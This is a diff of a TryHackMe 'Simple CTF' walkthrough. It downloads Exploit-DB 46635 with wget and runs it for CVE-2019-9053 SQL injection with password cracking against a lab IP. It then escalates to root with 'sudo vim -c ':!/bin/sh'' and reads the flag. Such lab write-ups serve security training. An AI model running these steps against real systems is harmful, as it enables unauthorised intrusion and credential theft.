@@ -107,53 +107,48 @@ CMS Made Simple < 2.2.10 - SQL Injection                               | https:/
 ----------------------------------------------------------------------- --------------------------------------------
 Shellcodes: No Results
 ```
-8. `firefox "https://www.exploit-db.com/exploits/46635"`
+8. `wget https://www.exploit-db.com/raw/46635`
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Simple%20CTF/CVE-2019-9053.png)
 
-# Vulnerability Exploitation
-> Exploiting CVE-2019-9053
-9. Download the Python exploit
-10. `cd downloads`
-```bash
-┌──(kali㉿kali)-[~]
-└─$ cd Downloads                                                               
-```
-11. `ls`
+9. `ls`
 ```bash
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ ls
- 46635.py               
+46635              
 ```
-12. `python 46635.py`
+
+# Vulnerability Exploitation
+> Exploiting CVE-2019-9053
+10. `python 46635`
 ```bash
 ┌──(kali㉿kali)-[~/Downloads]
-└─$ python 46635.py                                                       
+└─$ python 46635                                                       
   File "/home/kali/Downloads/46635.py", line 25
     print "[+] Specify an url target"
     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?
 ```
-13. `gedit python 46635.py` to open up the Python exploit and add parantheses for every print command that's missing one (Lines 25, 26, 27, 28, 63, 69, and 183) as well as change it from using the **python** interpreter () to the **python3** interpreter ()
+11. `gedit python 46635` to open up the Python exploit and add parantheses for every print command that's missing one (Lines 25, 26, 27, 28, 63, 69, and 183) as well as change it from using the **python** interpreter () to the **python3** interpreter ()
 ```bash
 ┌──(kali㉿kali)-[~/Downloads]
-└─$ gedit 46635.py 
+└─$ gedit 46635
 ```
 
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Simple%20CTF/Editing%2046635.py.png)
-14. `python 46635.py`
+12. `python 46635`
 ```bash
 ┌──(kali㉿kali)-[~/Downloads]
-└─$ python 46635.py    
+└─$ python 46635   
 [+] Specify an url target
 [+] Example usage (no cracking password): exploit.py -u http://target-uri
 [+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist
 [+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.
 ```
-15. `python 46635.py -u http://{TARGET IP}/simple --crack -w {WORDLIST PATH}`
+13. `python 46635 -u http://{TARGET IP}/simple --crack -w {WORDLIST PATH}`
 ```bash
 ┌──(kali㉿kali)-[~/Downloads]
-└─$ python3 46635.py -u http://10.10.130.66/simple --crack -w rockyou.txt
+└─$ python3 46635 -u http://10.10.130.66/simple --crack -w rockyou.txt
 
 [+] Salt for password found: 1dac0d92e9fa6bb2
 [+] Username found: mitch
@@ -169,14 +164,14 @@ Traceback (most recent call last):
     (result, consumed) = self._buffer_decode(data, self.errors, final)
 UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf1 in position 923: invalid continuation byte
 ```
-16. `gedit 46635.py`
+14. `gedit 46635`
 
-![]()
+![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Simple%20CTF/Editing%2046635.py%20pt2.png)
 
-17. `python3 -u http://{TARGET IP}/simple --crack -u {WORDLIST PATH}`
+15. `python3 46635 -u http://{TARGET IP}/simple --crack -u {WORDLIST PATH}`
 ```bash
 ┌──(kali㉿kali)-[~/Downloads]
-└─$ python3 46635.py -u http://10.10.130.66/simple --crack -w rockyou.txt
+└─$ python3 46635 -u http://10.10.130.66/simple --crack -w rockyou.txt
 
 [+] Salt for password found: 1dac0d92e9fa6bb2
 [+] Username found: mitch
@@ -234,15 +229,17 @@ User mitch may run the following commands on Machine:
     (root) NOPASSWD: /usr/bin/vim
 ```
 22. `firefox "https://gtfobins.github.io/" and search for vim
+
 ![]()
+
 23. `sudo vim -c ':!/bin/sh'`
 ```bash
 $ sudo vim -c ':!/bin/sh'
 #
 ```
-23. `whoami`
-24. `cd /root`
-25. `ls`
+24. `whoami`
+25. `cd /root`
+26. `ls`
 ```bash
 # whoami
 root
@@ -254,7 +251,7 @@ root
 # ls
 root.txt
 ```
-26. `cat root.txt`
+27. `cat root.txt`
 ```bash
 # cat root.txt  
 W3ll d0n3. You made it!
